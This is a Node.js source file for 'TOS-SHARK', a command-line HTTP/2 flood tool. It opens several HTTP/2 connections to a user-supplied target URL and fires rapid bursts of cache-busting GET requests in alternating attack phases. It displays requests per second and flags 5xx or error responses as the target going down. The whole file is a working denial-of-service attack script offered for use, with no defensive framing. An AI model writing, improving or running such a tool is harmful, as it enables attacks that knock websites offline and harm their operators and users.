const http2 = require('http2');

class TOS_SHARK {
    constructor(target) {
        this.target = target;
        const url = new URL(target);
        this.host = url.hostname;
        this.running = true;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        this.lastDisplay = Date.now();
        
        // H2 Connections
        this.conns = [];
        this.maxConns = 10;
        
        // Attack settings
        this.phase = 'H2_ATTACK';
        this.phaseEnd = Date.now() + 120000;
        
        // Print initial header
        this.printHeader();
        
        // Start
        this.start();
    }

    color(t, c) {
        const colors = { r: '\x1b[91m', g: '\x1b[92m', y: '\x1b[93m', b: '\x1b[94m', m: '\x1b[95m', c: '\x1b[96m', x: '\x1b[0m' };
        return `${colors[c] || ''}${t}${colors.x}`;
    }

    printHeader() {
        console.log(`${this.color('TØS-SHARK', 'c')} | ${this.color('CUSTOM', 'r')} | MT-3M22`);
        console.log(this.color('-----------------------------------------------------------------', 'c'));
    }

    start() {
        // Setup H2 connections
        for (let i = 0; i < this.maxConns; i++) {
            try {
                const client = http2.connect(this.target);
                client.setMaxListeners(1000);
                this.conns.push(client);
            } catch (e) {}
        }
        
        // Start attack
        this.attackLoop();
        this.displayLoop();
        
        process.on('SIGINT', () => {
            this.running = false;
            this.conns.forEach(c => c.destroy());
            process.exit(0);
        });
    }

    async attackLoop() {
        while (this.running) {
            // Check phase switch
            const now = Date.now();
            if (now > this.phaseEnd) {
                this.phase = this.phase === 'H2_ATTACK' ? 'H1_PHASE' : 'H2_ATTACK';
                this.phaseEnd = now + (this.phase === 'H2_ATTACK' ? 120000 : 20000);
            }
            
            if (this.phase === 'H2_ATTACK') {
                // H2 ABUSE - MAX RPS
                for (let i = 0; i < 50; i++) {
                    if (this.conns.length === 0) break;
                    
                    const client = this.conns[Math.floor(Math.random() * this.conns.length)];
                    
                    try {
                        const req = client.request({
                            ':method': 'GET',
                            ':path': `/?${Date.now()}_${this.reqCounter}`,
                            ':authority': this.host
                        });
                        
                        this.reqCounter++;
                        this.totalReqs++;
                        
                        req.on('response', (headers) => {
                            const status = headers[':status'];
                            this.logStatus(status);
                        });
                        
                        req.on('error', () => {
                            this.logStatus('ERROR');
                        });
                        
                        req.end();
                        
                    } catch (e) {
                        this.totalReqs++;
                    }
                }
            } else {
                // H1 Phase - minimal
                this.totalReqs += 5;
                await new Promise(r => setTimeout(r, 100));
            }
            
            await new Promise(r => setTimeout(r, 0.1));
        }
    }

    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 5000) {
            this.lastLog = now;
            
            let color = 'g', text = status;
            if (status === 'ERROR') {
                color = 'r';
                text = 'ERROR';
            } else if (status >= 500) {
                color = 'r';
            } else if (status >= 400) {
                color = 'y';
            } else if (status >= 300) {
                color = 'b';
            }
            
            console.log(`STS-HAROP-INT ---> ${this.color(text, color)}:0.1s`);
            
            // Down event (only for 5xx or ERROR)
            if (color === 'r' && (status >= 500 || status === 'ERROR')) {
                console.log(this.color(`{3M22-${this.reqCounter} --> ${status}}`, 'r'));
            }
        }
    }

    displayLoop() {
        const show = () => {
            if (!this.running) return;
            
            const now = Date.now();
            if (now - this.lastDisplay >= 1000) {
                this.lastDisplay = now;
                
                const runtime = now - this.startTime;
                const hours = Math.floor(runtime / 3600000);
                const minutes = Math.floor((runtime % 3600000) / 60000);
                const seconds = Math.floor((runtime % 60000) / 1000);
                const phaseLeft = Math.max(0, this.phaseEnd - now);
                
                const rps = this.totalReqs / (runtime / 1000);
                
                // Move cursor up and overwrite stats
                process.stdout.write('\x1b[2A'); // Move up 2 lines
                process.stdout.write('\x1b[0J'); // Clear from cursor to end
                
                console.log(`Runtime: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')} | Phase: ${this.color(this.phase, this.phase === 'H2_ATTACK' ? 'g' : 'm')} (${Math.round(phaseLeft/1000)}s)`);
                console.log(`Requests: ${this.color(this.totalReqs.toLocaleString(), 'g')} | RPS: ${this.color(rps.toFixed(1), 'g')} | Conns: ${this.conns.length}`);
                console.log(this.color('-----------------------------------------------------------------', 'c'));
            }
            
            setTimeout(show, 100);
        };
        
        show();
    }
}

// Run
if (require.main === module) {
    if (process.argv.length < 3) {
        console.log('Usage: node TOS.js https://target.com');
        process.exit(1);
    }
    new TOS_SHARK(process.argv[2]);
}
